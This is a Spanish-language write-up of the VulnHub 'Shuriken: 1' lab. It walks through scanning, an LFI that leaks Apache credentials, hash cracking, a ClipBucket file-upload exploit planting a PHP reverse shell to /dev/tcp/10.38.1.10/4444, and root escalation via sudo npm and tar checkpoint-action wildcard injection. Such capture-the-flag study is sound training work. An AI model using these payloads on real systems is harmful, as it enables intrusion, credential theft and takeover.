+++
title = 'shuriken: 1 - VulnHub'
+++

[link => shuriken: 1](https://www.vulnhub.com/entry/shuriken-1,600/)

---

## Escaneo de red con nmap para descubrir máquina objetivo

```bash
nmap -sn 10.38.1.0/24
```

![nmap host discovery](/images/shuriken1vulnhub/nmaphd.png)

### La IP de la máquina objetivo es **10.38.1.11**

## Escaneo de la máquina objetivo en busca de puertos abiertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.38.1.11 -oN targetscan
```

```txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targetscan
───────┼──────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Mon Feb  3 09:27:57 2025 as: /usr/lib/nmap/nmap -p- --open -sS 
       │ --min-rate 5000 -vvv -n -Pn -oN targetscan 10.38.1.11
   2   │ Nmap scan report for 10.38.1.11
   3   │ Host is up, received arp-response (0.000077s latency).
   4   │ Scanned at 2025-02-03 09:27:58 EST for 2s
   5   │ Not shown: 65533 closed tcp ports (reset), 1 filtered tcp port (no-response)
   6   │ Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
   7   │ PORT   STATE SERVICE REASON
   8   │ 80/tcp open  http    syn-ack ttl 64
   9   │ MAC Address: 08:00:27:7E:D9:03 (Oracle VirtualBox virtual NIC)
  10   │ 
  11   │ Read data files from: /usr/share/nmap
  12   │ # Nmap done at Mon Feb  3 09:28:00 2025 -- 1 IP address (1 host up) scanned in 3.18 seconds
───────┴──────────────────────────────────────────────────────────────────────────────────────────────
```

### **Puertos Abiertos: 80**

## Ejecución de scripts de nmap

```bash
sudo nmap -sCV -p80 10.38.1.11 -oN scriptsexec
```

```txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────
       │ File: scriptsexec
───────┼──────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Mon Feb  3 09:34:24 2025 as: /usr/lib/nmap/nmap -sCV -p80 -oN s
       │ criptsexec 10.38.1.11
   2   │ Nmap scan report for 10.38.1.11
   3   │ Host is up (0.00052s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
   7   │ |_http-server-header: Apache/2.4.29 (Ubuntu)
   8   │ |_http-title: Shuriken
   9   │ MAC Address: 08:00:27:7E:D9:03 (Oracle VirtualBox virtual NIC)
  10   │ 
  11   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
       │ .
  12   │ # Nmap done at Mon Feb  3 09:34:32 2025 -- 1 IP address (1 host up) scanned in 7.33 seconds
───────┴──────────────────────────────────────────────────────────────────────────────────────────────
```

## Enumeración de directorios con gobuster 

```bash
gobuster dir -u http://10.38.1.11/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.38.1.11/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 306] [--> http://10.38.1.11/img/]
/css                  (Status: 301) [Size: 306] [--> http://10.38.1.11/css/]
/js                   (Status: 301) [Size: 305] [--> http://10.38.1.11/js/]
/secret               (Status: 301) [Size: 309] [--> http://10.38.1.11/secret/]
/server-status        (Status: 403) [Size: 275]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

## Contenido de archivo js

![js files path](/images/shuriken1vulnhub/jsfiles.png)

![js file content](/images/shuriken1vulnhub/content7edjs.png)

![js file content](/images/shuriken1vulnhub/contentd8js.png)

![subdomain found](/images/shuriken1vulnhub/subdomain.png)

![js file content 2](/images/shuriken1vulnhub/contentd8js.png)

![route and parameter](/images/shuriken1vulnhub/route.png)

## Mapeo IP a subdominio

```bash
=====================
Agregar al /etc/hosts
=====================

10.38.1.11      broadcast.shuriken.local shuriken.local
```

## LFI en ruta encontrada en archivo js

![lfi result](/images/shuriken1vulnhub/lfiresult.png)

## Credenciales del servidor Apache

[Archivos de configuración de apache - digitalocean](https://www.digitalocean.com/community/tutorials/how-to-configure-the-apache-web-server-on-an-ubuntu-or-debian-vps) 

![http login](/images/shuriken1vulnhub/httplogin.png)

```txt
view-source:http://shuriken.local/index.php?referer=/etc/apache2/sites-available/000-default.conf
```

![auth file location](/images/shuriken1vulnhub/authfilelocation.png)

![creds](/images/shuriken1vulnhub/creds.png)

### Cracking de hash con john

```bash
───────┬───────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hash
───────┼───────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
───────┴───────────────────────────────────────────────────────────────────────────────────────────────
```

```bash
> john hash -w=/usr/share/wordlists/rockyou.txt 
Created directory: /home/fafi/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
9972761drmfsls   (?)     
1g 0:00:00:07 DONE (2025-02-03 11:16) 0.1428g/s 308736p/s 308736c/s 308736C/s 9991234..99686420
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
============
Credenciales
============

developers:9972761drmfsls
```

## Búsqueda de exploit con searchsploit

![software version](/images/shuriken1vulnhub/softwareversion.png)

```bash
> searchsploit clipbucket 4.0
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload  | php/webapps/44250.txt
ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload  | php/webapps/44250.txt
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
> searchsploit -m php/webapps/44250.txt
```

```txt
2. Unauthenticated Arbitrary File Upload
Below is the cURL request to upload arbitrary files to the webserver with no
authentication required.

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/beats_uploader.php"

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/photo_uploader.php"
```

## Subida de revshell

```php
───────┬───────────────────────────────────────────────────────────────────────────────────────────────
       │ File: revshell.php
───────┼───────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.38.1.10/4444 0>&1'"); ?>
───────┴───────────────────────────────────────────────────────────────────────────────────────────────
```

```bash
> curl -F "file=@revshell.php" -F "plupload=1" -F "name=revshell.php" -u developers:9972761drmfsls "http://broadcast.shuriken.local/actions/photo_uploader.php" | jq

{
  "success": "yes",
  "file_name": "1738602253b5ad58",
  "extension": "php",
  "file_directory": "2025/02/03"
}
```

![clipbucket docs](/images/shuriken1vulnhub/clipbucketdocs.png)

![file structure](/images/shuriken1vulnhub/filestructure.png)

![revshell path](/images/shuriken1vulnhub/revshellpath.png)

## Tratamiento de la tty

```bash
script /dev/null -c /bin/bash
[ctrl+z]
stty raw -echo; fg
reset xterm
export SHELL=/bin/bash
export TERM=xterm
stty rows <num of rows> columns <num of columns>
```

## Escalada de privilegios

```bash
www-data@shuriken:/home$ sudo -l
Matching Defaults entries for www-data on shuriken:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on shuriken:
    (server-management) NOPASSWD: /usr/bin/npm
```

```bash
www-data@shuriken:/home$ TF=$(mktemp -d)
www-data@shuriken:/home$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
www-data@shuriken:/home$ sudo -u server-management /usr/bin/npm -C $TF --unsafe-perm i

=========
A la primera puede dar error, dar todos los permisos al directorio que se genera
=========

www-data@shuriken:/home$ chmod 777 -R /tmp/tmp.RmmDdqTrya/
www-data@shuriken:/home$ sudo -u server-management /usr/bin/npm -C $TF --unsafe-perm i
```

### Flag del usuario server-management

```bash
$ script /dev/null -c /bin/bash
Script started, file is /dev/null
server-management@shuriken:/home$ ls
server-management
server-management@shuriken:/home$ cd server-management/
server-management@shuriken:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Shuriken  Templates  Videos  user.txt
server-management@shuriken:~$ cat user.txt 
67528***************************
```

### Monitoreo de tareas programadas con pspy

[pspy repo](https://github.com/DominicBreuker/pspy) 

```bash
> simplehttpserver 

   _____ _                 __     __  __________________                                
  / ___/(_)___ ___  ____  / /__  / / / /_  __/_  __/ __ \________  ______   _____  _____
  \__ \/ / __ -__ \/ __ \/ / _ \/ /_/ / / /   / / / /_/ / ___/ _ \/ ___/ | / / _ \/ ___/
 ___/ / / / / / / / /_/ / /  __/ __  / / /   / / / ____(__  )  __/ /   | |/ /  __/ /    
/____/_/_/ /_/ /_/ .___/_/\___/_/ /_/ /_/   /_/ /_/   /____/\___/_/    |___/\___/_/     
                /_/                                                       - v0.0.6

                projectdiscovery.io

Serving /home/fafi/Documents/vulnhub/shuriken1/content on http://0.0.0.0:8000/
[2025-02-03 13:17:14] 10.38.1.11:35494 "GET /pspy64 HTTP/1.1" 200 3104768
```


```bash
server-management@shuriken:~/Downloads$ curl http://10.38.1.10:8000/pspy64 -o pspy64
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3032k  100 3032k    0     0  44.1M      0 --:--:-- --:--:-- --:--:-- 44.1M
server-management@shuriken:~/Downloads$ ls
pspy64
server-management@shuriken:~/Downloads$ chmod +x pspy64 
server-management@shuriken:~/Downloads$ ls
pspy64
server-management@shuriken:~/Downloads$ 
server-management@shuriken:~/Downloads$ ./pspy64 

2025/02/03 20:10:01 CMD: UID=0     PID=18450  | /bin/bash /var/opt/backupsrv.sh 
```

### Contenido del archivo backupsrv.sh

```bash
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```
En este script utiliza * para seleccionar todos los archivos dentro del directorio Documents con el objetivo de realizar backups cada cierto tiempo con el comando **tar**. Esto se puede aprovechar creando archivos con nombres de parámetros adicionales para que asi **tar** los interprete.

```bash
server-management@shuriken:~/Documents$ touch -- --checkpoint=1
server-management@shuriken:~/Documents$ ls
'--checkpoint=1'
server-management@shuriken:~/Documents$ touch -- --checkpoint-action=exec='sh command'
server-management@shuriken:~/Documents$ ls
'--checkpoint-action=exec=sh command'  '--checkpoint=1'
server-management@shuriken:~/Documents$ nano command
server-management@shuriken:~/Documents$ cat command
#!/bin/bash

chmod u+s /bin/bash
server-management@shuriken:~/Documents$ chmod +x command
```

```bash
2025/02/03 20:10:01 CMD: UID=0     PID=18453  | tar czf /var/backups/shuriken-Monday.tgz --checkpoint=1 --checkpoint-action=exec=sh command command 
```

### Flag del usuario root

```bash
server-management@shuriken:/$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt 

d0f9****************************
                                          __                   
  ____  ____   ____    ________________ _/  |_  ______         
_/ ___\/  _ \ /    \  / ___\_  __ \__  \\   __\/  ___/         
\  \__(  <_> )   |  \/ /_/  >  | \// __ \|  |  \___ \          
 \___  >____/|___|  /\___  /|__|  (____  /__| /____  >         
     \/           \//_____/            \/          \/          
                                            __             .___
 ___.__. ____  __ __  _______  ____   _____/  |_  ____   __| _/
<   |  |/  _ \|  |  \ \_  __ \/  _ \ /  _ \   __\/ __ \ / __ | 
 \___  (  <_> )  |  /  |  | \(  <_> |  <_> )  | \  ___// /_/ | 
 / ____|\____/|____/   |__|   \____/ \____/|__|  \___  >____ | 
 \/                                                  \/     \/ 
  _________.__                 .__ __                          
 /   _____/|  |__  __ _________|__|  | __ ____   ____          
 \_____  \ |  |  \|  |  \_  __ \  |  |/ // __ \ /    \         
 /        \|   Y  \  |  /|  | \/  |    <\  ___/|   |  \        
/_______  /|___|  /____/ |__|  |__|__|_ \\___  >___|  /        
        \/      \/                     \/    \/     \/   
```


